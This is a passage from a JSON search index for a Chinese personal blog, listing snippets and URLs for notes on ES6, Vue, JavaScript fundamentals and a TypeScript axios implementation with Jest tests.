教程》笔记"],"lvl2":"摘要","objectID":"92b26a0bdee2891a5daa78dd17675e8d","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/13.set-%E5%92%8C-map-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"content":"Symbol 概述 ES5 的对象属性名都是字符串，这容易造成属性名的冲突。比如，你使用了一个他人提供的对象，但又想为这个对象添加新的方法（mixin 模式），新","lvl0":"Symbol","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"0f2a4e5a0499539f2dbe938af7041062","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/12.symbol/"},{"content":"编程风格 本章探讨如何将 ES6 的新语法，运用到编码实践之中，与传统的 JavaScript 语法结合在一起，写出合理的、易于阅读和维护的代码。 多家公司和组织已经公开了它","lvl0":"编程风格","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"8782b18f27bfecd3f34dc484f4efacc5","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/25.%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/"},{"content":"变量的解构赋值 数组的解构赋值 基本用法 ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构（Destructuring）。 以","lvl0":"变量的解构赋值","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"78250d35d7c09504c901106a74565761","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/03.%E5%8F%98%E9%87%8F%E7%9A%84%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/"},{"content":"读懂 ECMAScript 规格 概述 规格文件是计算机语言的官方标准，详细描述语法规则和实现方法。 一般来说，没有必要阅读规格，除非你要写编译器。因为规格写得非常抽象","lvl0":"读懂 ECMAScript 规格","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"b0cbcd0162dc9488aee05d2a5e479272","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/26.%E8%AF%BB%E6%87%82-ecmascript-%E8%A7%84%E6%A0%BC/"},{"content":"对象的扩展 对象（object）是 JavaScript 最重要的数据结构。ES6 对它进行了重大升级，本章介绍数据结构本身的改变，下一章介绍Object对象的新增方","lvl0":"对象的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"908aae965b8a69b6f6d990c8026894b5","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/10.%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"对象的新增方法 本章介绍 Object 对象的新增方法。 Object.is() ES5 比较两个值是否相等，只有两个运算符：相等运算符（==）和严格相等运算符（===）。它们都有缺点，","lvl0":"对象的新增方法","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"48abfb103a908810b419249c6be4f8a6","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/11.%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/"},{"content":"函数的扩展 函数参数的默认值 基本用法 ES6 之前，不能直接为函数的参数指定默认值，只能采用变通的方法。 1 2 3 4 5 6 7 8 function log(x, y) { y = y || \u0026#39;World\u0026#39;; console.log(x, y); } log(\u0026#39;Hello\u0026#39;) // Hello","lvl0":"函数的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"da7be89b2d409278ceed08a0b1d6b7e3","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/08.%E5%87%BD%E6%95%B0%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"数值的扩展 二进制和八进制表示法 ES6 提供了二进制和八进制数值的新的写法，分别用前缀0b（或0B）和0o（或0O）表示。 1 2 0b111110111 === 503 // true 0o767 === 503 // true 从","lvl0":"数值的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"c03ec68c3da40a616c451d069365997d","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/07.%E6%95%B0%E5%80%BC%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"数组的扩展 扩展运算符 含义 扩展运算符（spread）是三个点（...）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。 1 2 3 4 5 6","lvl0":"数组的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"59f97d0456595debb8366a7931849dfb","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/09.%E6%95%B0%E7%BB%84%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"异步遍历器 同步遍历器的问题 《遍历器》一章说过，Iterator 接口是一种数据遍历的协议，只要调用遍历器对象的next方法，就会得到一个对象，","lvl0":"异步遍历器","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"8237d4cc839bc6ea80e9b5b2f3e6b1d2","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/27.%E5%BC%82%E6%AD%A5%E9%81%8D%E5%8E%86%E5%99%A8/"},{"content":"正则的扩展 RegExp 构造函数 在 ES5 中，RegExp构造函数的参数有两种情况。 第一种情况是，参数是字符串，这时第二个参数表示正则表达式的修饰符（flag","lvl0":"正则的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"c45147fa93ab58b244ec9f379ffc94e8","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/06.%E6%AD%A3%E5%88%99%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"字符串的扩展 本章介绍 ES6 对字符串的改造和增强，下一章介绍字符串对象的新增方法。 字符的 Unicode 表示法 ES6 加强了对 Unicode 的支持，允许采用\\uxxxx形式表示一","lvl0":"字符串的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"78278c5664fd28591345b1a0bfe3736e","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/04.%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"字符串的新增方法 本章介绍字符串对象的新增方法。 String.fromCodePoint() ES5 提供String.fromCharCode()方法，用于从 Unicode 码点返回对应字符，但是这个方法","lvl0":"字符串的新增方法","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"fc3d5f7f57752f2bfc29fc7cf6e0c607","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/05.%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/"},{"content":"JS随机打乱数组 1 2 3 4 5 6 7 8 9 10 11 12 13 function shuffle(arr) { // 随机打乱数组 let _arr = arr.slice() // 调用数组副本，不改变原数组 for (let i = 0; i \u0026lt; _arr.length; i++) { let j = getRandomInt(0, i) let t = _arr[i] _arr[i] =","lvl0":"JS随机打乱数组","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"0654c18f65347007faa8b61f12d8d95f","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/50.js%E9%9A%8F%E6%9C%BA%E6%89%93%E4%B9%B1%E6%95%B0%E7%BB%84/"},{"content":"列表渲染之数组、对象更新检测 数组更新检测API 对象更新检测API 数组更新检测 变异方法 (mutation method) Vue 将被侦听的数组的变异方法进行了包裹，所以它们也将会","lvl0":"列表渲染之数组、对象更新检测","lvl1":["《Vue》笔记","基础"],"lvl2":"摘要","objectID":"a38b152075bd0de11192d709db1ebd0e","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/35.%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E4%B9%8B%E6%95%B0%E7%BB%84%E5%AF%B9%E8%B1%A1%E6%9B%B4%E6%96%B0%E6%A3%80%E6%B5%8B/"},{"content":"v-if vs v-show API v-if 根据渲染条件决定是否把元素渲染到DOM页面，而v-show不管渲染条件是什么，都会把元素渲染到DOM页面，只是简单的切换CSS的显","lvl0":"v-if vs v-show","lvl1":["《Vue》笔记","基础"],"lvl2":"摘要","objectID":"0e38816214214a20abb5d7332317c026","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/30.v-if-vs-v-show/"},{"content":"计算属性 vs 方法 vs 侦听属性 API 如果一个功能同时可以使用计算属性(computed)、方法(methods)、侦听属性(watch)来实现的时候推","lvl0":"计算属性 vs 方法 vs 侦听属性","lvl1":["《Vue》笔记","基础"],"lvl2":"摘要","objectID":"6eb43bce9e726737a02f22bd71fe8ece","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/20.%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7-vs-%E6%96%B9%E6%B3%95-vs-%E4%BE%A6%E5%90%AC%E5%B1%9E%E6%80%A7/"},{"content":"实例生命周期钩子 实例生命周期钩子API 简单理解，生命周期钩子函数就是vue实例在某一个时间点会自动执行的函数。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15","lvl0":"生命周期","lvl1":["《Vue》笔记","基础"],"lvl2":"摘要","objectID":"bc4633839ed1ed7e2d896adb9f17530b","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/10.%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"},{"content":"路由懒加载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // 路由同步加载 // import Recommend from \u0026#39;@/components/recommend/recommend\u0026#39; // import Singer from \u0026#39;@/components/singer/singer\u0026#39; // import Rank from \u0026#39;@/components/rank/rank\u0026#39; // import Search from \u0026#39;@/components/search/search\u0026#39; // import SingerDetail from \u0026#39;@/components/singer-detail/singer-detail\u0026#39; // import Disc from \u0026#39;@/components/disc/disc\u0026#39; // import TopList from \u0026#39;@/components/top-list/top-list\u0026#39; // import","lvl0":"路由懒加载","lvl1":["《Vue》笔记","规模化"],"lvl2":"摘要","objectID":"634024cd75f891662cecf8896ee253d4","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/06.%E8%A7%84%E6%A8%A1%E5%8C%96/140.%E8%B7%AF%E7%94%B1%E6%87%92%E5%8A%A0%E8%BD%BD/"},{"content":"transition-group列表过渡 列表的进入/离开过渡 1 2 3 \u0026lt;transition-group tag=\u0026#34;ul\u0026#34;\u0026gt; \u0026lt;!--tag转为ul--\u0026gt; \u0026lt;li v-for=\u0026#34;item in list\u0026#34; :key=\u0026#34;item\u0026#34;\u0026gt;{{item}}\u0026lt;/li\u0026gt; \u0026lt;!--子元素","lvl0":"transition-group列表过渡","lvl1":["《Vue》笔记","过渡\u0026动画"],"lvl2":"摘要","objectID":"8589dbdd6f06d82e8b1716682b9c1b27","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/03.%E8%BF%87%E6%B8%A1%E5%8A%A8%E7%94%BB/120.transition-group%E5%88%97%E8%A1%A8%E8%BF%87%E6%B8%A1/"},{"content":"transition过渡\u0026amp;动画 API 使用 需要设置动画的元素或组件要在外边包裹一个\u0026lt;transition\u0026gt;标签，设置自定义的n","lvl0":"transition过渡\u0026动画","lvl1":["《Vue》笔记","过渡\u0026动画"],"lvl2":"摘要","objectID":"9d0f5c9e4554707e09aa68795b4d3967","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/03.%E8%BF%87%E6%B8%A1%E5%8A%A8%E7%94%BB/110.transition%E8%BF%87%E6%B8%A1%E5%8A%A8%E7%94%BB/"},{"content":"vuex操作相关 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { mapActions, mapMutations, mapGetters } from \u0026#39;vuex\u0026#39; computed: { ...mapGetters([ // 获取数据，内部为数组 \u0026#39;searchHistory\u0026#39; // 相当于在data插入searc","lvl0":"vuex操作相关","lvl1":["《Vue》笔记","规模化"],"lvl2":"摘要","objectID":"6ca7ae1cf14d28339e0b9806279eaa12","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/06.%E8%A7%84%E6%A8%A1%E5%8C%96/100.vuex%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3/"},{"content":"操作本地缓存 https://github.com/ustbhuangyi/storage 操作 sessionStorage 和 localStorage 。","lvl0":"操作本地缓存","lvl1":["《Vue》笔记","其他"],"lvl2":"摘要","objectID":"e620854642bace21ec4e6db98ab4b30a","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/99.%E5%85%B6%E4%BB%96/90.%E6%93%8D%E4%BD%9C%E6%9C%AC%E5%9C%B0%E7%BC%93%E5%AD%98/"},{"content":"Vue中的防抖函数封装和使用 如搜索框中，每改变一个数值就请求一次搜索接口，当快速的改变数值时并不需要多次请求接口，这就需要一个防抖函数： 1 2","lvl0":"Vue中的防抖函数封装和使用","lvl1":["《Vue》笔记","其他"],"lvl2":"摘要","objectID":"a80ae1721d912c4e05d5cd4f7c34fdb2","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/99.%E5%85%B6%E4%BB%96/80.vue%E4%B8%AD%E7%9A%84%E9%98%B2%E6%8A%96%E5%87%BD%E6%95%B0%E5%B0%81%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"content":"父组件调用子组件方法并传入值 通过ref引用调用子组件内的方法并传入参数 父组件： 1 2 3 4 5 6 7 \u0026lt;子组件标签 ref=\u0026#34;refNam","lvl0":"父组件调用子组件方法并传入值","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"89a9294685a6435fa34dbb197491a90c","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/70.%E7%88%B6%E7%BB%84%E4%BB%B6%E8%B0%83%E7%94%A8%E5%AD%90%E7%BB%84%E4%BB%B6%E6%96%B9%E6%B3%95%E5%B9%B6%E4%BC%A0%E5%85%A5%E5%80%BC/"},{"content":"兄弟组件传值 子组件1中把值传到父组件,父组件获取值传入子组件2 父组件： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;子组件1 @方法名x=\u0026#34;方法","lvl0":"兄弟组件传值","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"c08dd202a3b694329d92160527caecc9","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/60.%E5%85%84%E5%BC%9F%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"},{"content":"子组件派发事件和值给父组件 API 子组件通过$emit派发事件和值给父组件（值可以有多个） 1 this.$emit(\u0026#39;fnX\u0026#39;, value) 父组件通过v-on绑定子组件派发的事件，并触发一个","lvl0":"子组件派发事件和值给父组件","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"85c3630697a47f5810d03026c6578dd5","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/50.%E5%AD%90%E7%BB%84%E4%BB%B6%E6%B4%BE%E5%8F%91%E4%BA%8B%E4%BB%B6%E5%92%8C%E5%80%BC%E7%BB%99%E7%88%B6%E7%BB%84%E4%BB%B6/"},{"content":"父组件给子组件传值 父组件中，通过给子组件标签v-bind绑定属性的方式传入值 1 \u0026lt;ComponentName v-bind:name=\u0026#34;value\u0026#34;\u0026gt;\u0026lt;/ComponentName\u0026gt; 如果不使用v-bind传入的值为字符串，使用v-bind绑","lvl0":"父组件给子组件传值","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"2c9ebbf8582982115e814f2bde06b2af","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/40.%E7%88%B6%E7%BB%84%E4%BB%B6%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"},{"content":":::tip 说明：本章内容是博主的Vue学习笔记，以官方文档为准。 ::: MVVM模式 MVVM模式，M即 model，数据模型；V即 view，视图；VM即 vi","lvl0":"MVVM模式","lvl1":["《Vue》笔记","基础"],"lvl2":"摘要","objectID":"44dc02ca5c5d1065b9983b790a4a231b","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/00.mvvm%E6%A8%A1%E5%BC%8F/"},{"content":"","lvl0":"《Vue》笔记","lvl1":null,"lvl2":"摘要","objectID":"b4b58ed2ceba4bb4c2ad82135f16b857","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.vue%E7%AC%94%E8%AE%B0/"},{"content":"一个完美主义者的自我救赎 最近，看到一个心理测试题是测试你是否有完美主义： （1）你是不是经常为自己设定目标，而且最终往往达不到那些目标？ （2）","lvl0":"一个完美主义者的自我救赎","lvl1":["更多","心情杂货"],"lvl2":"摘要","objectID":"a826273649540875cf314ac016b0212d","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/05.%E5%BF%83%E6%83%85%E6%9D%82%E8%B4%A7/01.%E4%B8%80%E4%B8%AA%E5%AE%8C%E7%BE%8E%E4%B8%BB%E4%B9%89%E8%80%85%E7%9A%84%E8%87%AA%E6%88%91%E6%95%91%E8%B5%8E/"},{"content":"","lvl0":"《ES6 教程》笔记","lvl1":null,"lvl2":"摘要","objectID":"9cdca8974e52be240d8c1248b280aff6","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"content":"说明：本章内容为博主在原教程基础上添加自己的学习笔记，来源http://es6.ruanyifeng.com/，教程版权归原作者所有。 ECMAScript 6 简","lvl0":"ECMAScript 6 简介","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"9ac33b6166edd6f3a6b92c119e3a5655","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/01.ecmascript-6-%E7%AE%80%E4%BB%8B/"},{"content":"","lvl0":"《JavaScript教程》笔记","lvl1":null,"lvl2":"摘要","objectID":"02c44b2169681c0a55c238910d16beb6","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/00.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"content":"DOM 一、概述 1、DOM DOM 是 JavaScript 操作网页的接口，全称为“文档对象模型”（Document Object Model）。它的作用是将网页转为一个 JavaScript 对象，从而可以用","lvl0":"DOM","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"47c3b3d06c1a81b924ab0975ec17493e","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/05.dom/"},{"content":"说明：本章内容为博主在原教程基础上添加自己的学习笔记，来源https://wangdoc.com/javascript/，教程版权归原作者所","lvl0":"基础","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"9e81f31c6b9487834165fec3bfbae7d9","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/"},{"content":"浏览器模型 一、浏览器环境概述 JavaScript 是浏览器的内置脚本语言。也就是说，浏览器内置了 JavaScript 引擎，并且提供各种接口，让 JavaScript 脚本可以控制浏览器的各种功能。一旦","lvl0":"浏览器模型","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"184c0fa9f263cff79cbf08a0bbbd6ad9","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/07.%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/"},{"content":"面向对象编程 一、实例对象与new命令 1、对象是什么 面向对象编程（Object Oriented Programming，缩写为 OOP）是目前主流的编程范式。它","lvl0":"面向对象","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"616ba1332ee24c36e0a9c403c54a2903","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/03.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"content":"内置对象篇 一、Object对象 1、概述 JavaScript 原生提供Object对象（注意起首的O是大写），本章介绍该对象原生的各种方法。 JavaScript 的所有其他对象都继承","lvl0":"内置对象","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"9f09bede01df917c27bbf001f9b7fb89","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/02.%E5%86%85%E7%BD%AE%E5%AF%B9%E8%B1%A1/"},{"content":"事件 一、EventTarget 接口 事件的本质是程序各个组成部分之间的一种通信方式，也是异步编程的一种实现。DOM 支持大量的事件，本章开始介绍","lvl0":"事件","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"ea97373c29d1a36a02b4180f660615e1","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/06.%E4%BA%8B%E4%BB%B6/"},{"content":"异步操作 一、异步操作概述 1、单线程模型 单线程模型指的是，JavaScript 只在一个线程上运行。也就是说，JavaScript 同时只能执行一","lvl0":"异步操作","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"b76d9592934b0829ee7896d566d41368","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/04.%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/"},{"content":"axios 函数重载 需求分析 目前我们的 axios 函数只支持传入 1 个参数，如下： 1 2 3 4 5 6 7 axios({ url: \u0026#39;/extend/post\u0026#39;, method: \u0026#39;post\u0026#39;, data: { msg: \u0026#39;hi\u0026#39; } }) 我们希望该函数也能支持传入 2 个参数，如下： 1","lvl0":"axios 函数重载","lvl1":["《TypeScript 从零实现 axios》","ts-axios 接口扩展"],"lvl2":"摘要","objectID":"d7ee4d94c0d065e5a0b51ed22525692a","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/06.ts-axios-%E6%8E%A5%E5%8F%A3%E6%89%A9%E5%B1%95/02.axios-%E5%87%BD%E6%95%B0%E9%87%8D%E8%BD%BD/"},{"content":"Axios 实例模块单元测试 ts-axios 提供了 axios.create 静态方法，返回一个 instance 实例，我们需要对这个模块做测试。 测试代码编写 test/instance.spec.ts： 1 2","lvl0":"Axios 实例模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"2363b2377f1559e1efa17519fc94cbb1","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/06.axios-%E5%AE%9E%E4%BE%8B%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"baseURL 需求分析 有些时候，我们会请求某个域名下的多个接口，我们不希望每次发送请求都填写完整的 url，希望可以配置一个 baseURL，之后都可以传相","lvl0":"baseURL","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"251d5338dc806325c198984f83edda38","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/07.baseurl/"},{"content":"headers 模块单元测试 之前我们测试了 headers 的基础方法模块，接下来我们会从业务角度测试 headers 的相关业务逻辑。 测试代码编写 test/headers.spec.t","lvl0":"headers 模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"f9d43fa72d8ce9b6416428b48a9cc31c","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/05.headers-%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"HTTP 授权 需求分析 HTTP 协议中的 Authorization 请求 header 会包含服务器用于验证用户代理身份的凭证，通常会在服务器返回 401 Unauthorized 状态码以及 WWW-Authenticate 消息头之后在后续请求中发送此消息头","lvl0":"HTTP 授权","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"1bdab7125ca1669b6f99602f6f529202","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/04.http-%E6%8E%88%E6%9D%83/"},{"content":"Jest 安装和配置 Jest 安装 由于我们的项目是使用 typescript-library-starter 初始化的，已经内置了 Jest 的安装，但是安装的版本却不是最新的，我们可以对 package.json 中的相关依赖版本做修改，重新安","lvl0":"Jest 安装和配置","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"1dcc199e84b368d94d8a86534ae79de0","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/02.jest-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/"},{"content":"mergeConfig 模块单元测试 合并配置是 ts-axios 核心流程中非常重要的一个环节，我们需要为它的各种情况去编写测试。 测试代码编写 